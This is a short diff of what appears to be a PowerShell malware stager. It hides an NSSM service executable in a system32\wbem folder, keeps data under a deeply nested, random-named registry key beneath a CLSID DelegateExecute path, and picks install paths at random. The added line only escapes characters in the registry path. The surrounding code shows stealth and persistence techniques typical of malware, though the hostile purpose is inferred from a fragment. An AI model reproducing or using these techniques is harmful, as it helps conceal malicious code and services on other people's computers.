@@ -13,6 +13,7 @@ $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
 $basePath = "HKCU:\Software\Classes\CLSID\$guid\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system\yXureYzQpIRLN"
+$basePath = $basePath -replace '([\\{}])', '`$1'
 
 if(($rootPath -eq $null) -or ($rootPath -eq "")){
     $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
